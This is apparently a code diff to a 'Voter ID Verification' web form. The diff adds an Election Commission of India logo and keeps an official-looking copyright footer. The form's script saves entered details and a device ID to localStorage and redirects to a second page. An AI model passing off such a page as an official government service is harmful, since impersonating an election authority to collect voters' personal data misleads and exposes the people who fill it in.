@@ -23,10 +23,19 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
             width: 100%; 
             max-width: 450px; 
+            text-align: center;
+        }
+
+        .logo-box {
+            margin-bottom: 15px;
+        }
+        .logo-box img {
+            width: 60px;
+            height: auto;
+            object-fit: contain;
         }
 
         .form-container h2 { 
-            text-align: center; 
             margin-bottom: 20px; 
             color: #0056b3; 
             font-size: 22px; 
@@ -34,6 +43,7 @@
 
         .form-group { 
             margin-bottom: 15px; 
+            text-align: left; 
         }
 
         .form-group label { 
@@ -76,7 +86,6 @@
             background: #004085; 
         }
 
-        /* Footer (कॉपीराइट टेक्स्ट) की डिज़ाइन */
         .footer-text {
             text-align: center;
             margin-top: 25px;
@@ -90,6 +99,11 @@
 </head>
 <body>
     <div class="form-container">
+        
+        <div class="logo-box">
+            <img src="logo.png" alt="Election Commission Logo">
+        </div>
+
         <h2>Voter ID Verification</h2>
         
         <form id="voterForm">
@@ -111,7 +125,6 @@
             <button type="submit" class="btn-next">Next</button>
         </form>
 
-        <!-- यहाँ पर सबसे नीचे कॉपीराइट जोड़ दिया गया है -->
         <div class="footer-text">
             © 2026 Election Commission of India. All rights reserved.
         </div>
@@ -121,10 +134,9 @@
         document.getElementById('voterForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Device ID generate karne ka logic
             let deviceId = localStorage.getItem('voterDeviceId');
             if (!deviceId) {
-                deviceId = 'DEV-' + Math.random().toString(36.substr(2, 9)).toUpperCase();
+                deviceId = 'DEV-' + Math.random().toString(36).substr(2, 9).toUpperCase();
                 localStorage.setItem('voterDeviceId', deviceId);
             }
 
@@ -134,7 +146,6 @@
 
             let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
             
-            // Naya entry save karein
             submissions.push({
                 deviceId: deviceId,
                 fullname: fullname,
@@ -145,7 +156,7 @@
 
             localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
 
-            // Agle page par bhejें
+            // 👉 यहाँ आपके दूसरे पेज का असली नाम होना चाहिए (secondpage.html)
             window.location.href = "secondpage.html";
         });
     </script>
